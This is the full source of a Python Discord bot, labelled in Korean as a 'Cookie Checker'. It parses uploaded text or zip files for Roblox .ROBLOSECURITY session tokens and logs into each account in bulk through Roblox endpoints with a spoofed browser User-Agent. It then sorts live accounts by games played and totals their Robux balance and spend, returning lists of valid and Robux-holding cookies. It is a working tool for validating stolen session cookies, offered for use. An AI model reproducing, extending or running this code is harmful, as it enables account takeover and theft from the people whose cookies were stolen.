# -*- coding: utf-8 -*-
import os, re, io, asyncio, aiohttp, datetime as dt, random, zipfile, time
import discord
from discord.ext import commands
from discord import Interaction
from discord.ui import View

# ========================
# 환경변수/설정
# ========================
TOKEN = os.getenv("DISCORD_TOKEN")
GUILD_ID = os.getenv("GUILD_ID")  # 선택

MENU_PUBLIC = True
RESULTS_EPHEMERAL = True

# 속도/안정(1분 컷 목표)
FAST_MODE = True          # True: 지출 1p, 배지 30개
CHUNK_SIZE = 500
CONCURRENCY_AUTH = 10     # 429 시 8~10 권장
CONCURRENCY_BADGE = 8
CONCURRENCY_ECON = 8
MULTI_FILE_CONCURRENCY = 4
BIND_ATTACHMENTS = True   # 여러 첨부 합본 파이프
MAX_TOTAL = 0
MAX_TRX_PAGES = 1 if FAST_MODE else 10

# 커스텀 이모지(요청 반영)
EMOJ = {
    "ok": "<a:emoji_8:1411690712344301650>",
    "fail": "<a:emoji_7:1411690688403345528>",
    "speed": "<a:emoji_21:1413797526993371146>",        # 속도
    "grow": "<:emoji_20:1413786764744720436>",
    "brainrot": "<:emoji_23:1413870877719658636>",       # 브레인롯
    "adopt": "<:emoji_19:1413786747921371226>",
    "blox": "<:emoji_17:1413786669001216071>",
    "robux": "<:emoji_11:1411978635480399963>",
    "spend": "<a:emoji_22:1413870861311672350>",         # 지출
}

# ========================
# 네트워크
# ========================
AIOHTTP_TIMEOUT = aiohttp.ClientTimeout(total=20, sock_connect=4, sock_read=12)
TCP_CONN: aiohttp.TCPConnector | None = None

def new_session(cookies=None):
    global TCP_CONN
    if TCP_CONN is None:
        TCP_CONN = aiohttp.TCPConnector(
            limit=0, limit_per_host=40, ttl_dns_cache=300, enable_cleanup_closed=True
        )
    return aiohttp.ClientSession(
        timeout=AIOHTTP_TIMEOUT,
        connector=TCP_CONN,
        cookies=cookies or {},
        headers={"Accept-Encoding": "gzip", "Connection": "keep-alive"}
    )

async def fetch_json_with_retry(session: aiohttp.ClientSession, method: str, url: str, **kw):
    tries = 0
    while True:
        tries += 1
        try:
            async with session.request(method, url, **kw) as r:
                if r.status == 429:
                    ra = r.headers.get("Retry-After")
                    wait = float(ra) if ra else min(2 ** tries, 6) + random.random()
                    await asyncio.sleep(wait)
                    if tries < 4:
                        continue
                if 500 <= r.status < 600 and tries < 3:
                    await asyncio.sleep(min(2 ** tries, 4) + random.random())
                    continue
                if r.status >= 400:
                    try:
                        data = await r.json()
                    except:
                        data = {"error": await r.text()}
                    return r.status, data
                return r.status, await r.json()
        except Exception as e:
            if tries >= 3:
                return 599, {"error": f"{type(e).__name__}: {e}"}
            await asyncio.sleep(min(2 ** tries, 3) + random.random())

# ========================
# 공통 UI/포맷
# ========================
COLOR_BASE = discord.Color.from_rgb(0, 0, 0)
COLOR_BLUE = discord.Color.blurple()

def make_embed(title: str | None = None, desc: str = "", color: discord.Color = COLOR_BASE) -> discord.Embed:
    emb = discord.Embed(description=desc, color=color)
    if title:
        emb.title = title
    return emb

def progress_embed() -> discord.Embed:
    desc = "\n".join([
        "## 체킹 진행 중 / 소요시간 약 1분",
        "곧 완료됩니다 조금만 기다려주세요"
    ])
    return discord.Embed(description=desc, color=COLOR_BLUE)

def fmt_num(n: int | float) -> str:
    try:
        return f"{int(n):,}"
    except:
        try:
            return f"{float(n):,.2f}"
        except:
            return str(n)

def fmt_rbx(n: int | float) -> str:
    return f"{fmt_num(n)} R$"

def fmt_sec(s: float) -> str:
    return f"{s:.2f}초"

def main_menu_embed() -> discord.Embed:
    return discord.Embed(
        title="쿠키 체커기",
        description="파일을 업로드해 유효/만료, 게임, 로벅스 요약을 확인하세요.",
        color=COLOR_BASE
    )

# ========================
# 텍스트 정규화(제로폭/제어문자 제거)
# ========================
def normalize_text(s: str) -> str:
    if not s:
        return ""
    s = s.replace("\ufeff", "").replace("\u200b", "").replace("\u200d", "")
    s = s.replace("\r\n", "\n").replace("\r", "\n").replace("\t", " ")
    return "".join(ch for ch in s if ch.isprintable() or ch in "\n ")

# ========================
# 게임 프리셋(이름만 사용)
# ========================
GAMES = {
    "그어가": {"key":"grow_a_garden", "universeId":7436755782},
    "입양":   {"key":"adopt_me",      "universeId":383310974},
    "브레인롯":{"key":"brainrot",      "universeId":7709344486},
    "블피":   {"key":"blox_fruits",   "universeId":994732206},
}

KEY_TO_NAME = {
    "grow_a_garden": "그어가",
    "adopt_me": "입양",
    "brainrot": "브레인롯",
    "blox_fruits": "블피",
}

# ========================
# 파일/토큰 인식(대량/중복/패턴 보강)
# ========================
SUPPORTED_TEXT_EXT = {".txt", ".log", ".csv", ".json"}
SUPPORTED_ARCHIVE_EXT = {".zip"}

ORDER_TOKEN_RE = re.compile(r"(_?\|WARNING[^\s\"';]+)")  # _|WARNING / |WARNING
BACKUP_PATTERNS = [
    re.compile(r"(?i)\.?\s*ROBLOSECURITY\s*=\s*([^\s\"';]+)"),
    re.compile(r"(?i)\"ROBLOSECURITY\"\s*:\s*\"([^\"]+)\""),
    re.compile(r"(?i)Cookie:\s*[^;]*ROBLOSECURITY\s*=\s*([^\s;]+)"),
]

def _clean_token(v: str) -> str:
    return (v or "").replace("\u200b", "").replace("\ufeff", "").strip()

def extract_tokens_from_text(text: str) -> list[str]:
    out = []
    # WARNING 우선(같은 라인 2회 등장도 전부 캐치) — Order 예시 패턴 기준 [[1]](about:blank) [[2]](about:blank) [[3]](about:blank) [[4]](about:blank) [[5]](about:blank)
    for m in ORDER_TOKEN_RE.finditer(text or ""):
        out.append(_clean_token(m.group(1)))
    # 백업 패턴(.ROBLOSECURITY/헤더/JSON) — 내부에 WARNING 있으면 그 지점부터 재슬라이스
    for rgx in BACKUP_PATTERNS:
        for m in rgx.finditer(text or ""):
            raw = _clean_token(m.group(1))
            if "_|WARNING" in raw:
                raw = raw[raw.find("_|WARNING"):]
            elif "|WARNING" in raw:
                raw = raw[raw.find("|WARNING"):]
            out.append(raw)
    return out

def parse_cookies_blob(raw_text: str) -> list[tuple[str, str]]:
    tokens = extract_tokens_from_text(raw_text or "")
    seen, pairs = set(), []
    for tok in tokens:
        tok = _clean_token(tok)
        if not tok or any(ch.isspace() for ch in tok):
            continue
        # (선택) 잘린 토큰 잡는 라이트 필터: 핵심 조각 + 길이
        if "|_CAEaAhAB." in tok and len(tok) < 100:
            continue
        if tok not in seen:
            seen.add(tok)
            pairs.append((tok, tok))  # (auth, outv)
    return pairs

async def extract_texts_from_attachment(att: discord.Attachment):
    name = (att.filename or "file").lower()
    data = await att.read()
    texts = []
    def dec(b: bytes):
        try:
            return b.decode("utf-8")
        except:
            return b.decode("utf-8", errors="ignore")
    if any(name.endswith(ext) for ext in SUPPORTED_ARCHIVE_EXT):
        with zipfile.ZipFile(io.BytesIO(data)) as zf:
            for info in zf.infolist():
                if info.is_dir(): continue
                lname = info.filename.lower()
                if not any(lname.endswith(ext) for ext in SUPPORTED_TEXT_EXT): continue
                if info.file_size > 8 * 1024 * 1024: continue
                with zf.open(info, "r") as f:
                    texts.append(dec(f.read()))
        return texts or [dec(data)], "zip"
    return [dec(data)], "text"

# ========================
# 인증/데이터 조회(성공률 최우선 3단계)
# ========================
async def check_cookie_once(cookie_value: str):
    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
    HDR = {
        "User-Agent": UA,
        "Referer": "https://www.roblox.com/",
        "Origin": "https://www.roblox.com",
        "Accept": "application/json, text/plain, */*",
        "Connection": "keep-alive",
    }
    token = _clean_token(cookie_value)
    try:
        async with new_session(cookies={'.ROBLOSECURITY': token}) as s:
            stA, dataA = await fetch_json_with_retry(s, "GET", "https://www.roblox.com/my/settings/json", headers=HDR)
            if stA == 200 and isinstance(dataA, dict) and (dataA.get("Name") or dataA.get("UserName")):
                return True, None, None, dataA.get("Name") or dataA.get("UserName")
            stB, dataB = await fetch_json_with_retry(s, "GET", "https://www.roblox.com/mobileapi/userinfo", headers=HDR)
            if stB == 200 and isinstance(dataB, dict) and (dataB.get("UserID") or dataB.get("UserName")):
                uid = dataB.get("UserID")
                uname = dataB.get("UserName") or dataB.get("UserDisplayName")
                return True, None, (int(uid) if uid else None), uname
            stC, dataC = await fetch_json_with_retry(s, "GET", "https://users.roblox.com/v1/users/authenticated", headers=HDR)
            if stC == 200 and isinstance(dataC, dict) and dataC.get("id"):
                return True, None, int(dataC["id"]), dataC.get("name") or dataC.get("displayName")
            bad = stA or stB or stC
            if bad in (401, 403):
                return False, None, None, None
            return False, f"unexpected {bad}", None, None
    except Exception as e:
        return False, f"{type(e).__name__}: {e}", None, None

async def bulk_authenticate(pairs):
    sem = asyncio.Semaphore(CONCURRENCY_AUTH)
    async def worker(auth):
        async with sem:
            return await check_cookie_once(auth)
    return await asyncio.gather(*[worker(auth) for auth, _ in pairs])

async def get_user_badges(user_id: int, session: aiohttp.ClientSession, limit: int):
    out, cursor = [], None
    base = f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100&sortOrder=Desc"
    fetch_limit = limit
    while True:
        url = base + (f"&cursor={cursor}" if cursor else "")
        st, data = await fetch_json_with_retry(session, "GET", url)
        if st != 200: break
        out.extend(data.get("data", []))
        cursor = data.get("nextPageCursor")
        if not cursor or len(out) >= fetch_limit: break
    return out[:fetch_limit]

async def get_played_games_for_user(user_id: int, auth_cookie: str):
    played = set()
    try:
        async with new_session(cookies={'.ROBLOSECURITY': auth_cookie}) as s:
            badges = await get_user_badges(user_id, s, limit=(30 if FAST_MODE else 100))
            uni_by_key = {
                "grow_a_garden": 7436755782,
                "adopt_me": 383310974,
                "brainrot": 7709344486,
                "blox_fruits": 994732206,
            }
            for b in badges:
                uni = b.get("awardingUniverse")
                if not isinstance(uni, dict): continue
                uid = int(uni.get("id") or 0)
                for k, u in uni_by_key.items():
                    if u == uid:
                        played.add(k)
            return played
    except:
        return played

async def fetch_robux_balance(user_id: int, session: aiohttp.ClientSession) -> int:
    st, data = await fetch_json_with_retry(session, "GET", f"https://economy.roblox.com/v1/users/{user_id}/currency")
    if st == 200 and isinstance(data, dict): return int(data.get("robux", 0))
    return 0

async def sum_total_spend(user_id: int, session: aiohttp.ClientSession, max_pages: int = MAX_TRX_PAGES) -> int:
    total, cursor, pages = 0, None, 0
    base = f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchase&limit=100"
    while pages < max_pages:
        url = base + (f"&cursor={cursor}" if cursor else "")
        st, data = await fetch_json_with_retry(session, "GET", url)
        if st != 200 or not isinstance(data, dict): break
        for row in data.get("data", []):
            amt = int(row.get("amount", 0))
            total += abs(amt)
        cursor = data.get("nextPageCursor")
        pages += 1
        if not cursor: break
    return total

async def get_robux_and_spend(user_id: int, auth_cookie: str) -> tuple[int, int]:
    try:
        async with new_session(cookies={'.ROBLOSECURITY': auth_cookie}) as s:
            bal, spend = await asyncio.gather(
                fetch_robux_balance(user_id, s),
                sum_total_spend(user_id, s, MAX_TRX_PAGES)
            )
            return bal, spend
    except:
        return 0, 0

# ========================
# 처리 도우미/청크
# ========================
def chunked(seq, n):
    for i in range(0, len(seq), n):
        yield seq[i:i+n]

# ========================
# 파일검증(핵심 파이프)
# ========================
async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
    raw_text = normalize_text(raw_text)
    pairs = parse_cookies_blob(raw_text)
    if not pairs:
        return await dm.send(embed=make_embed(None, "파일에서 쿠키를 찾지 못했습니다.", color=discord.Color.red()))

    if MAX_TOTAL and len(pairs) > MAX_TOTAL:
        pairs = pairs[:MAX_TOTAL]

    total_cnt = len(pairs)
    done_cnt = 0
    chunk_idx = 0

    for part in chunked(pairs, CHUNK_SIZE):
        chunk_idx += 1
        t0_chunk = time.perf_counter()

        # 1) 인증(전부)
        auth_results = await bulk_authenticate(part)

        # ok면 성공(UID 없어도), UID 있는 것만 추가 조회
        valid_tokens: list[str] = []
        ok_entries: list[tuple[str, str, int, str]] = []
        for (auth, outv), res in zip(part, auth_results):
            ok, err, uid, uname = res
            if ok:
                valid_tokens.append(outv)
                if uid:
                    ok_entries.append((auth, outv, uid, uname))

        # 2) 게임 분류
        game_buckets: dict[str, list[str]] = {"grow_a_garden": [], "brainrot": [], "adopt_me": [], "blox_fruits": []}
        if ok_entries:
            sem_badge = asyncio.Semaphore(CONCURRENCY_BADGE)
            async def one_badge(item):
                auth, outv, uid, uname = item
                async with sem_badge:
                    keys = await get_played_games_for_user(uid, auth)
                    return outv, keys
            played_results = await asyncio.gather(*[one_badge(it) for it in ok_entries])
            for outv, keys in played_results:
                for k in keys:
                    if k in game_buckets:
                        game_buckets[k].append(outv)

        # 3) 로벅스 요약
        total_robux_sum = 0
        total_spend_sum = 0
        robux_positive_list: list[str] = []
        if ok_entries:
            sem_econ = asyncio.Semaphore(CONCURRENCY_ECON)
            async def one_econ(item):
                auth, outv, uid, uname = item
                async with sem_econ:
                    bal, spend = await get_robux_and_spend(uid, auth)
                    return outv, bal, spend
            econ_results = await asyncio.gather(*[one_econ(it) for it in ok_entries])
            for outv, bal, spend in econ_results:
                total_robux_sum += max(bal, 0)
                total_spend_sum += max(spend, 0)
                if bal > 0:
                    robux_positive_list.append(outv)

        # 4) 결과 파일
        files: list[discord.File] = []
        if valid_tokens:
            buf_valid = io.BytesIO(("\n".join(valid_tokens)).encode("utf-8"))
            files.append(discord.File(buf_valid, filename=f"valid_cookies_part{chunk_idx}.txt"))
        if robux_positive_list:
            buf_pos = io.BytesIO(("\n".join(robux_positive_list)).encode("utf-8"))
            files.append(discord.File(buf_pos, filename=f"robux_positive_part{chunk_idx}.txt"))

        # ───────── 임베드(제목 없음, 요청 포맷) ─────────
        elapsed_chunk = time.perf_counter() - t0_chunk

        cnt_grow = len(game_buckets.get("grow_a_garden", []))
        cnt_brain = len(game_buckets.get("brainrot", []))
        cnt_adopt = len(game_buckets.get("adopt_me", []))
        cnt_blox  = len(game_buckets.get("blox_fruits", []))

        succ_cnt = len(valid_tokens)
        fail_cnt = len(part) - succ_cnt

        if succ_cnt > 0 and fail_cnt == 0:
            color_pick = discord.Color.from_rgb(0, 180, 110)
        elif succ_cnt > 0:
            color_pick = discord.Color.from_rgb(230, 150, 20)
        else:
            color_pick = discord.Color.from_rgb(200, 60, 60)

        desc_lines = [
            "## 체커결과",
            f"{EMOJ['ok']}유효: {fmt_num(succ_cnt)}개 / {EMOJ['fail']}만료: {fmt_num(fail_cnt)}개 {EMOJ['speed']}속도: {fmt_sec(elapsed_chunk)}",
            "",
            "## 플레이한 게임",
            f"{EMOJ['grow']}그어가: {fmt_num(cnt_grow)}개 / {EMOJ['brainrot']}브레인롯: {fmt_num(cnt_brain)}개",
            f"{EMOJ['adopt']}입양: {fmt_num(cnt_adopt)}개 / {EMOJ['blox']}블피: {fmt_num(cnt_blox)}개",
            "",
            "## 로벅스",
            f"{EMOJ['robux']}보유: {fmt_num(total_robux_sum)}$ / {EMOJ['spend']}지출: {fmt_num(total_spend_sum)}$",
        ]
        emb = discord.Embed(
            description="\n".join(desc_lines),
            color=color_pick
        )
        emb.timestamp = dt.datetime.now(dt.timezone.utc)
        emb.set_footer(text=f"Cookie Checker • 청크 {chunk_idx} • 처리: {fmt_num(len(part))}개")

        done_cnt += len(part)
        await dm.send(embed=emb, files=files or None)

# ========================
# DM 파일검증 뷰(진행중 임베드 + 대량 합본)
# ========================
class DMFilePromptView(discord.ui.View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=120)
        self.bot = bot
        self.busy = False

    @discord.ui.button(label="파일검증", style=discord.ButtonStyle.secondary, custom_id="file_check_btn")
    async def dm_btn(self, inter: Interaction, button: discord.ui.Button):
        if self.busy:
            return await inter.response.send_message(embed=make_embed(None, "이미 진행 중이야. DM 확인해줘.", color=COLOR_BASE), ephemeral=True)
        self.busy = True
        try:
            dm = await inter.user.create_dm()
        except Exception as e:
            self.busy = False
            return await inter.response.send_message(embed=make_embed(None, f"DM 허용을 켜줘. ({e})", color=discord.Color.red()), ephemeral=True)

        await inter.response.send_message(embed=make_embed(None, "DM 보냈어. 파일 올려줘.", color=COLOR_BASE), ephemeral=True)

        await dm.send(embed=make_embed(
            None,
            "여기에 파일 올려줘.\n- 지원: txt/log/csv/json/zip\n- 제한: 2분 내 업로드",
            color=COLOR_BASE
        ))

        def check_msg(m: discord.Message):
            return (not m.author.bot) and (m.author.id == inter.user.id) and (m.channel.id == dm.id) and (len(m.attachments) > 0)

        try:
            msg: discord.Message = await self.bot.wait_for("message", check=check_msg, timeout=120)
        except asyncio.TimeoutError:
            self.busy = False
            return await dm.send(embed=make_embed(None, "시간 초과. 다시 [파일검증] 눌러 시작해줘.", color=discord.Color.red()))

        atts = [a for a in msg.attachments if a.size > 0]
        if not atts:
            self.busy = False
            return await dm.send(embed=make_embed(None, "파일이 비어있어. 다시 올려줘!", color=discord.Color.red()))

        # 진행 중 임베드 먼저 표시(제목 없음)
        await dm.send(embed=progress_embed())

        try:
            if BIND_ATTACHMENTS and len(atts) > 1:
                async def read_one(att: discord.Attachment):
                    texts, _ = await extract_texts_from_attachment(att)
                    return normalize_text("\n\n".join(texts))
                all_texts = await asyncio.gather(*[read_one(a) for a in atts])
                combined = "\n\n".join(all_texts)
                await handle_file_check_logic_dm(dm, combined)
            else:
                sem_files = asyncio.Semaphore(MULTI_FILE_CONCURRENCY)
                async def process_one(att: discord.Attachment):
                    async with sem_files:
                        texts, _ = await extract_texts_from_attachment(att)
                        combined = normalize_text("\n\n".join(texts))
                        await handle_file_check_logic_dm(dm, combined)
                await asyncio.gather(*[process_one(a) for a in atts])
        except Exception as e:
            await dm.send(embed=make_embed(None, f"처리 실패: {type(e).__name__}: {e}", color=discord.Color.red()))
        finally:
            self.busy = False

# ========================
# 버튼 뷰(파일검증만 노출)
# ========================
class CheckView(View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="파일검증", style=discord.ButtonStyle.secondary, custom_id="file_check_btn")
    async def b3(self, inter: Interaction, button: discord.ui.Button):
        emb = make_embed(
            None,
            "아래 버튼을 누르면 봇이 DM 보낼게.",
            color=COLOR_BASE
        )
        view = DMFilePromptView(inter.client)
        await inter.response.send_message(embed=emb, view=view, ephemeral=True)

# ========================
# 봇 본체
# ========================
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix=".", intents=intents)

    async def setup_hook(self):
        try:
            if GUILD_ID:
                gid = int(GUILD_ID)
                await self.tree.sync(guild=discord.Object(id=gid))
            else:
                await self.tree.sync()
        except Exception as e:
            print("[SYNC] 실패:", e)

bot = MyBot()

@bot.event
async def on_ready():
    try:
        bot.add_view(CheckView(bot))
        print("[VIEW] persistent CheckView 등록 완료")
    except Exception as e:
        print("[VIEW] 등록 실패:", e)
    print("[VER] fast=ON, bind=ON, auth=3step(settings->mobile->users), parse=WARNING/_|WARNING, valid=ok(any), uidOnlyForEcon, progressEmbed=ON")
    print(f"{dt.datetime.now(dt.timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC → 로그인: {bot.user}")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Cookie Checker"))

# ========================
# 메뉴/명령
# ========================
@bot.tree.command(name="체커기", description="체커기 생성하기")
async def check(inter: Interaction):
    if MENU_PUBLIC:
        await inter.response.send_message(embed=main_menu_embed(), view=CheckView(bot))
    else:
        await inter.response.send_message(embed=main_menu_embed(), view=CheckView(bot), ephemeral=True)

@bot.tree.command(name="파일검증", description="DM으로 파일을 받아 일괄 검증합니다")
async def file_check(inter: Interaction):
    emb = make_embed(None, "봇 DM 확인해줘.", color=COLOR_BASE)
    await inter.response.send_message(embed=emb, ephemeral=True)
    try:
        dm = await inter.user.create_dm()
        await dm.send(embed=make_embed(
            None,
            "여기에 파일을 올려주세요.\n- 지원: txt/log/csv/json/zip\n- 제한: 2분 내 업로드",
            color=COLOR_BASE
        ))
    except Exception as e:
        await inter.followup.send(embed=make_embed(None, f"DM 전송 실패: {e}", color=discord.Color.red()), ephemeral=True)

if __name__ == "__main__":
    if not TOKEN:
        raise RuntimeError("환경변수 DISCORD_TOKEN 이 설정되지 않았습니다.")
    bot.run(TOKEN)
